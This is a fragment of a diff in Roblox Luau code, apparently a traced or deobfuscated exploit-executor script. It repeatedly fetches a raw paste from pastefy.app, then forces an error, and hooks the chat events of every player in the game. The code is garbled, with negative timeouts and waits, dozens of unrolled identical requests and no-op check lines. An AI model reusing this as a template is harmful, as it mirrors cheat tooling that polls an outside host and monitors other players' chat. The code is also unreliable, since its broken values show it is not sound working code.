+    local _callrequest691 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest691.Body
+    task.wait(- 60)
+    local _callrequest695 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest695.Body
+    task.wait(- 60)
+    local _callrequest699 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest699.Body
+    task.wait(- 60)
+    local _callrequest703 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest703.Body
+    task.wait(- 60)
+    local _callrequest707 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest707.Body
+    task.wait(- 60)
+    local _callrequest711 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest711.Body
+    task.wait(- 60)
+    local _callrequest715 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest715.Body
+    task.wait(- 60)
+    local _callrequest719 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest719.Body
+    task.wait(- 60)
+    local _callrequest723 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest723.Body
+    task.wait(- 60)
+    local _callrequest727 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest727.Body
+    task.wait(- 60)
+    local _callrequest731 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest731.Body
+    task.wait(- 60)
+    local _callrequest735 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest735.Body
+    task.wait(- 60)
+    local _callrequest739 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest739.Body
+    task.wait(- 60)
+    local _callrequest743 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest743.Body
+    task.wait(- 60)
+    local _callrequest747 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest747.Body
+    task.wait(- 60)
+    local _callrequest751 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest751.Body
+    task.wait(- 60)
+    local _callrequest755 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest755.Body
+    task.wait(- 60)
+    local _callrequest759 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest759.Body
+    task.wait(- 60)
+    local _callrequest763 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest763.Body
+    task.wait(- 60)
+    local _callrequest767 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest767.Body
+    task.wait(- 60)
+    local _callrequest771 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest771.Body
+    task.wait(- 60)
+    local _callrequest775 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest775.Body
+    task.wait(- 60)
+    local _callrequest779 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest779.Body
+    task.wait(- 60)
+    local _callrequest783 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest783.Body
+    task.wait(- 60)
+    local _callrequest787 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest787.Body
+    task.wait(- 60)
+    local _callrequest791 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest791.Body
+    task.wait(- 60)
+    local _callrequest795 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest795.Body
+    task.wait(- 60)
+    local _callrequest799 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest799.Body
+    task.wait(- 60)
+    local _callrequest803 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest803.Body
+    task.wait(- 60)
+    local _callrequest807 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest807.Body
+    task.wait(- 60)
+    local _callrequest811 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest811.Body
+    task.wait(- 60)
+    local _callrequest815 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest815.Body
+    task.wait(- 60)
+    local _callrequest819 = request({
+        Url = "https://pastefy.app/nmcuhZc1/raw",
+        Method = "GET",
+        Timeout = - 10,
+    })
+    local _ = not _callrequest819.Body
+    error("internal 542: <25ms: infinitelooperror>")
+end)
+for _825, _825_2 in pairs(_call240:GetPlayers()) do
+    CHECKIF(_825)
+    CHECKIF(_825_2.Chatted)
+    _825_2.Chatted:Connect(function(...)
+        local _ = _825_2.Name
+    end)
+end
+_call240.PlayerAdded:Connect(function(...)
+    local _836_vararg1 = ...
+    local _ = not _836_vararg1.Chatted
+    _836_vararg1.Chatted:Connect(function(...)
+        local _ = _836_vararg1.Name
+    end)
+end)
+CHECKIF(_LocalPlayer241)
+CHECKIF(_LocalPlayer241.Chatted)
+_LocalPlayer241.Chatted:Connect(function(...)
+    local _ = _LocalPlayer241.Name
+end)
+local _call854 = _call243:WaitForChild("DefaultChatSystemChatEvents", - 5):WaitForChild("OnMessageDoneFiltering", - 5)
+
+CHECKIF(_call854.OnClientEvent)
+_call854.OnClientEvent:Connect(function(...)
+    local _860_vararg1 = ...
+    CHECKIF(_860_vararg1.FromSpeaker)
+    CHECKIF(_860_vararg1)
+    CHECKIF(_860_vararg1.Message)
+end)
